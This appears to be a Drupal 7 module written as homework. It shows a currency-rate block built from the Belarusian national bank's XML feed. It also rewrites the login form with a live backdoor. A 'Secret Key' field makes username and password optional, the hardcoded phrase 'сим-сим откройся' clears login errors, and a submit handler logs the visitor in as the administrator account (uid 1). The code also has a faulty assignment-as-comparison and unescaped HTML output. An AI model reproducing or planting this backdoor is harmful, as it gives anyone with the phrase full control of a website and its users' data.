<?php

/**
 * @file
 * Homework on topic Block and Menu.
 */

/**
 * Implements hook_block_info().
 */
function training2_form_block_info() {
  $blocks['currency'] = array(
    'info' => t('Currency block'),
    'cache' => DRUPAL_CACHE_GLOBAL,
  );

  return $blocks;
}

/**
 * Implements hook_block_configure().
 */
function training2_form_block_configure($delta = '') {
  $form = array();

  if ($delta = 'currency') {
    $arrCurrency = training2_form_conf_content();

    $form['form_currency'] = array(
      '#type' => 'checkboxes',
      '#title' => t('Choose currencies'),
      '#options' => drupal_map_assoc($arrCurrency),
    );
  }

  return $form;
}

/**
 * Implements hook_block_save().
 */
function training2_form_block_save($delta = '', $edit = array()) {

  if ($delta == 'currency') {
    variable_set('form_currency', $edit['form_currency']);
  }
}

/**
 * Implements hook_block_view().
 */
function training2_form_block_view($delta = '') {
  $block = array();

  switch ($delta) {
    case 'currency':
      $block['subject'] = t('Currency');
      $block['content'] = training2_form_content();
      break;

    case 'user-login-form':
      $block['content'] = print_r('hello');
      break;
  }

  return $block;
}

/**
 * Function drupal_map_assoc() uses return array.

 * @return array
 *   Return array which includes CharCode and Rate.
 */
function training2_form_conf_content() {
  $xmlArray = training2_form_get_xml_data();
  $currency = $xmlArray['Currency'];

  $arrValue = array();
  $n = count($currency);
  for ($i = 0; $i < $n; $i++) {
    $arrValue[$i] = $currency[$i]['CharCode'] . ' - ' . $currency[$i]['Rate'];
  }
  return $arrValue;
}

/**
 * Transformation XML.
 *
 * @return mixed
 *   Return array currency.
 */
function training2_form_get_xml_data() {
  $url = 'http://www.nbrb.by/Services/XmlExRates.aspx';
  $xmlData = simplexml_load_file($url);
  $jsonData = json_encode($xmlData);
  $xmlArray = json_decode($jsonData, TRUE);

  return $xmlArray;
}

/**
 * Display block content.
 */
function training2_form_content() {
  $xmlArray = training2_form_get_xml_data();
  $date = $xmlArray['@attributes']['Date'];
  $choose = variable_get('form_currency');
  $chooseCurrency = implode($choose, '<br />');
  $returnStr = strstr($chooseCurrency, '<br />0<br />', TRUE);
  $dated = date('d-m-Y H:i:s');
  $text = t('Update time:');
  $result = $date . '<br />' . $returnStr . '<br /><br />' . $text . '<br />' . $dated;

  return $result;
}

/**
 * Implements hook_form_FORM_ID_alter().
 */
function training2_form_form_user_login_block_alter(&$form, &$form_state, $form_id) {
  $form['secret_key'] = array(
    '#type' => 'textfield',
    '#title' => t('Secret Key'),
    '#size' => 15,
    '#weight' => 0,
  );
  $form['name']['#required'] = FALSE;
  $form['pass']['#required'] = FALSE;
  array_push($form['#validate'], 'training2_form_form_user_login_block_validate');
  array_unshift($form['#submit'], 'training2_form_form_user_login_block_submit');

  return $form;
}

/**
 * Validate new login form.
 *
 * @param array $form
 *   Nested array of new login form elements.
 * @param array $form_state
 *   A keyed array containing the current state of the new login form.
 */
function training2_form_form_user_login_block_validate($form, &$form_state) {

  if (($form_state['values']['secret_key']) != '') {
    if ($form_state['values']['secret_key'] == 'сим-сим откройся') {
      form_clear_error();
      drupal_get_messages();
    }
    else {
      form_set_error('text', t('Secret key is incorrect.'));
    }
  }
}

/**
 * Submit new login form.
 *
 * @param array $form
 *   Nested array of new login form elements.
 * @param array $form_state
 *   A keyed array containing the current state of the new login form.
 */
function training2_form_form_user_login_block_submit($form, &$form_state) {
  global $user;
  $form_state['uid'] = 1;
  $user = user_load($form_state['uid']);
  user_login_finalize($form_state);
}

/**
 * Implements hook_theme().
 */
function training2_form_theme() {
  $items['user_login_block'] = array(
    'render element' => 'form',
    'template' => 'templates/training2_form_login_template',
  );

  return $items;
}
